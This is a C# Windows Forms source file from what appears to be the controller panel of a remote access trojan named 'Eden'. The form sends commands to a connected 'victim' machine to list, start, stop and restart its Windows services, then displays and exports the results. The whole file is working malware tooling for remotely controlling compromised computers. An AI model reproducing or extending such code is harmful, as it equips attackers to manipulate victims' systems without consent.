using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmService : Form
    {
        public clsVictim m_victim { get; init; }

        public frmService(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            Text = $@"Service\\{m_victim.m_szID}";
        }

        void fnRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (!string.Equals(szVictimID, m_victim.m_szID))
                return;

            if (lsMsg[0] == "serv")
            {
                if (lsMsg[1] == "ls")
                {
                    var ls2d = clsTools.EZData.String2TwoDList(lsMsg[2]);
                    foreach (var ls in ls2d)
                    {
                        ListViewItem item = new ListViewItem(ls[0]);
                        for (int i = 1; i < ls.Count; i++)
                            item.SubItems.Add(ls[i]);

                        Invoke(new Action(() => listView1.Items.Add(item)));
                    }

                    Invoke(() => toolStripStatusLabel1.Text = $"Service[{listView1.Items.Count}]");
                }
                else if (lsMsg[1] == "start")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    string szName = lsMsg[3];

                    Invoke(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Start service failed.");
                }
                else if (lsMsg[1] == "stop")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    string szName = lsMsg[3];

                    Invoke(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Stop service failed.");
                }
                else if (lsMsg[1] == "restart")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    string szName = lsMsg[3];

                    Invoke(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Restart service failed.");
                }
            }
        }

        void fnInitServ()
        {
            listView1.Items.Clear();
            toolStripStatusLabel1.Text = "Loading...";

            m_victim.fnSendCommand(new string[]
            {
                "Service",
                "ls",
            });
        }

        void fnSetup()
        {
            m_victim.m_clnt.ServerMessageReceived += fnRecv;

            listView1.View = View.Details;
            listView1.FullRowSelect = true;
            listView1.Columns.Add("Name", 200);
            listView1.Columns.Add("Load", 80);
            listView1.Columns.Add("Active", 80);
            listView1.Columns.Add("Sub", 80);
            listView1.Columns.Add("Description", 250);

            listView1.ContextMenuStrip = contextMenuStrip1;

            ToolStripMenuItem itemAll = new ToolStripMenuItem("All");
            itemAll.Click += (s, e) =>
            {
                StringBuilder sb = new StringBuilder();
                foreach (ListViewItem item in listView1.SelectedItems)
                    sb.AppendLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));

                Clipboard.SetText(sb.ToString());
                toolStripStatusLabel1.Text = "Clipboard set text successfully.";
            };

            toolStripMenuItem1.DropDownItems.Add(itemAll);
            toolStripMenuItem1.DropDownItems.Add(new ToolStripSeparator());

            for (int i = 0; i < listView1.Columns.Count; i++)
            {
                ColumnHeader column = listView1.Columns[i];
                ToolStripMenuItem item = new ToolStripMenuItem(column.Text);

                int nIdx = i;
                item.Click += (s, e) =>
                {
                    List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
                    if (items.Count == 0)
                        return;

                    string szContent = string.Join("\n", items.Select(x => x.SubItems[nIdx].Text));
                    Clipboard.SetText(szContent);

                    toolStripStatusLabel1.Text = "Clipboard set text successfully.";
                };

                toolStripMenuItem1.DropDownItems.Add(item);
            }

            fnInitServ();
        }

        private void frmService_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmService_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnRecv;
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            fnInitServ();
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {

        }

        //Start
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                m_victim.fnSendCommand(new string[]
                {
                    "Service",
                    "start",
                    item.Text,
                });
            }
        }

        //Stop
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                m_victim.fnSendCommand(new string[]
                {
                    "Service",
                    "stop",
                    item.Text,
                });
            }
        }

        //Restart
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                m_victim.fnSendCommand(new string[]
                {
                    "Service",
                    "restart",
                    item.Text,
                });
            }
        }

        //Export
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    StringBuilder sb = new StringBuilder();
                    sb.AppendLine(string.Join(",", listView1.Columns.Cast<ColumnHeader>().Select(x => x.Text)));
                    foreach (ListViewItem item in listView1.Items)
                        sb.AppendLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));

                    File.WriteAllText(sfd.FileName, sb.ToString());

                    MessageBox.Show("Save file successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.A)
                {
                    listView1.Items.Cast<ListViewItem>().ToList().ForEach(x => x.Selected = true);
                }
                else if (e.KeyCode == Keys.S)
                {
                    SaveFileDialog sfd = new SaveFileDialog();
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            StringBuilder sb = new StringBuilder();
                            sb.AppendLine(string.Join(",", listView1.Columns.Cast<ColumnHeader>().Select(x => x.Text)));
                            foreach (ListViewItem item in listView1.Items)
                                sb.AppendLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));

                            File.WriteAllText(sfd.FileName, sb.ToString());

                            MessageBox.Show("Save file successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    fnInitServ();
                }
            }
        }
    }
}
